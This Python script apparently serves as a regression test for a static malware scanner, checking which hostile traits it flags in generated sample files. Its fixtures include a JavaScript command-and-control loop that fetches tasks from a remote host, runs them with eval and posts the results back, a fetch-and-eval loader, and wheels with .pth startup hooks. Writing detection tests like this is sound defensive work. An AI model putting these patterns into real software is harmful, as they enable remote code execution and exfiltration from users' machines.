#!/usr/bin/env python3
"""Static regression controls; no specimen or generated program is executed."""
import argparse
import json
from pathlib import Path
import subprocess
import tempfile
import zipfile

ROOT = Path(__file__).resolve().parents[3]
DISPATCH = 'objectives/command-and-control/remote-command/dispatch::'
OLD_LOADER = 'objectives/supply-chain/trojanized/library/module-init::module-scope-remote-code-loader'
OLD_SNAPSHOT = 'objectives/discovery/host/fingerprint::wheel-pth-startup-host-cloud-snapshot'
SNAPSHOT = 'objectives/discovery/host/fingerprint::wheel-pth-host-cloud-snapshot-code'
UPLOAD = 'micro-behaviors/communications/http/upload::fetch-eval-result-body'


def reports(text):
    while text.strip():
        text = text.lstrip()
        obj, length = json.JSONDecoder().raw_decode(text)
        yield from obj.get('files', [obj])
        text = text[length:]


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--cleave', default='cleave')
    parser.add_argument('--wheel', type=Path, required=True)
    parser.add_argument('--output', type=Path)
    args = parser.parse_args()
    with zipfile.ZipFile(args.wheel) as archive:
        source = archive.read('research_probe_6150c1c915/_boot.py').decode()
    task = '''async function tick() {
 const response = await fetch('https://cdn.jsdelivr.net/tasks');
 const task = await response.json();
 switch (task.command) {
 case 'execute':
  const answer = eval(task.code);
  await fetch('https://cdn.jsdelivr.net/return', {method:'POST',body:JSON.stringify({answer})});
  break;
 }
}
function configure() { return 1; }
configure();
'''
    cases = {
        'task.js': task,
        'renamed.ts': task.replace('task', 'job').replace('answer', 'result').replace('/return', '/receive'),
        'static-eval.js': task.replace('eval(task.code)', "eval('2+2')"),
        'unrelated-body.js': task.replace('JSON.stringify({answer})', "JSON.stringify({status:'ready'})"),
        'result-url-only.js': task.replace("'https://cdn.jsdelivr.net/return'", 'answer').replace('JSON.stringify({answer})', "'ready'"),
        'comment.js': '/*' + task + '*/',
        # A configurable plugin loader with an unrelated module-level call is
        # not evidence of a trojanized library or an import-time eval chain.
        'loader.js': '''async function loadPlugin() {
 const r = await fetch('https://cdn.jsdelivr.net/npm/acorn@8/dist/acorn.js');
 eval(await r.text());
}
function configure() { return 1; }
configure();
''',
        'updater.ps1': "$update = 'C:\\Program Files\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe'\nWrite-Output $update\n",
        'google.ps1': "Write-Output 'GoogleUpdate.exe'\n",
        'third-party.ps1': "Write-Output 'AdobeARM.exe'\n",
        'schema.ps1': '''$xml = @"
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Settings><Hidden>false</Hidden></Settings></Task>
"@
Write-Output $xml
''',
    }
    with tempfile.TemporaryDirectory(prefix='fallout-review-') as tmp:
        directory = Path(tmp)
        for name, body in cases.items():
            (directory / name).write_text(body)
        for name, hook in [('unrelated', 'import harmless\n'), ('path-only', 'support\n'), ('startup', 'import survey\n')]:
            with zipfile.ZipFile(directory / (name + '-1.0-py3-none-any.whl'), 'w') as archive:
                archive.writestr('probe.pth', hook)
                archive.writestr('harmless.py', 'pass\n')
                archive.writestr('survey.py', source)
                archive.writestr('probe-1.0.dist-info/METADATA', 'Metadata-Version: 2.1\nName: probe\nVersion: 1.0\n')
        result = subprocess.run([args.cleave, '--traits-dir', str(ROOT), '--format', 'json', str(directory)],
                                check=True, capture_output=True, text=True)
        if args.output:
            args.output.write_text(result.stdout)
        files = {Path(f['path']).name: f for f in reports(result.stdout) if '!!' not in f['path']}
        assert len(files) == len(cases) + 3, files.keys()
        for name, file in files.items():
            findings = {t['id']: t['crit'] for t in file.get('traits', [])}
            assert OLD_LOADER not in findings and OLD_SNAPSHOT not in findings, name
            actual_hostile = {trait for trait, level in findings.items() if level == 5}
            expected_hostile = {DISPATCH + 'http-code-task-and-result-upload'} if name in ('task.js', 'renamed.ts') else set()
            assert actual_hostile == expected_hostile, (name, actual_hostile, expected_hostile)
            assert (UPLOAD in findings) == (name in ('task.js', 'renamed.ts', 'static-eval.js')), (name, findings)
            if name.endswith('.whl') and name.startswith(('startup-', 'unrelated-')):
                assert findings[SNAPSHOT] == 4, (name, findings)
            if name.startswith('path-only-'):
                assert SNAPSHOT not in findings, (name, findings)
            if name == 'loader.js':
                assert findings[DISPATCH + 'http-response-eval-with-module-call'] == 4
            if name in ('updater.ps1', 'google.ps1', 'third-party.ps1'):
                specific = {'updater.ps1': 'microsoft', 'google.ps1': 'google', 'third-party.ps1': 'third-party'}[name]
                assert findings['micro-behaviors/fs/path/basename::' + specific + '-updater-exe-name'] == 3
                assert not any(level >= 4 for level in findings.values()), (name, findings)
            print('PASS', name)
    print('14 static first-review controls passed')


if __name__ == '__main__':
    main()
